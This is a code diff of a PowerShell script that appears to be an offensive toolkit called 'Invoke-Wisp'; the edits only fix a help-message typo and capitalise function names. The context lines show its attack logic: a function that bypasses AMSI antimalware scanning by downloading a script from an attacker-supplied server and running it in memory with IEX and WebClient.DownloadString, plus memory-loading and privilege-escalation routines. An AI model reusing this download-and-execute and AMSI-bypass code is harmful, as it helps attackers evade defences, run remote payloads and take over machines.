@@ -5,13 +5,13 @@ $global:url_1029384756=$null
 $global:memory_loaded_1029384756=0
 
 function Invoke-Wisp {
-    [Parameter(Mandatory, HelpMessage = "Please provide an server url address using -url 'http://<your_server>/'")]
+    [Parameter(Mandatory, HelpMessage = "Please provide a server url address using -url 'http://<your_server>/'")]
     Param([string]$url)
     $global:url_1029384756=$url
     bypass_amsi
 }
 
-function bypass_amsi {
+function Bypass_AMSI {
     if($global:url_1029384756 -eq $null){
         Write-Host -NoNewline -ForegroundColor DarkRed " [ERROR]"
         Write-Host -NoNewline -ForegroundColor Yellow " Use "
@@ -22,7 +22,7 @@ function bypass_amsi {
     IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/isma.txt")
 }
 
-function memory_load {
+function Memory_Load {
     if($url_1029384756 -eq $null){
         Write-Host -NoNewline -ForegroundColor DarkRed " [ERROR]"
         Write-Host -NoNewline -ForegroundColor Yellow " Use "
@@ -42,7 +42,7 @@ function memory_load {
     $global:memory_loaded_1029384756=1
 }
 
-function escalation {
+function Escalation {
     if($url_1029384756 -eq $null){
         Write-Host -NoNewline -ForegroundColor DarkRed " [ERROR]"
         Write-Host -NoNewline -ForegroundColor Yellow " Use "
